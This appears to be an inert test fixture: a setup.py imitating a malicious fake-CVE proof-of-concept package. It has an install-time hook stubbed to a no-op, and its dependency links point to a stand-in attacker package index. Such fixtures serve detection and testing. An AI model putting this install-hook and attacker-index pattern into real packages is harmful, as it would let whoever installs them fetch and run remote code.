# INERT FIXTURE - do not `pip install` this. The custom install command below is
# the ChocoPoC-style install-time hook; here run() is a no-op stub.
from setuptools import setup
from setuptools.command.install import install


class PostInstall(install):
    def run(self):
        # In the real campaign this executed the dropper. Stubbed to a no-op.
        pass


setup(
    name="cve-2026-00000-poc",
    version="0.0.1",
    install_requires=["skytext", "frint"],
    dependency_links=["https://pypi.attacker.example/simple"],
    cmdclass={"install": PostInstall},
)
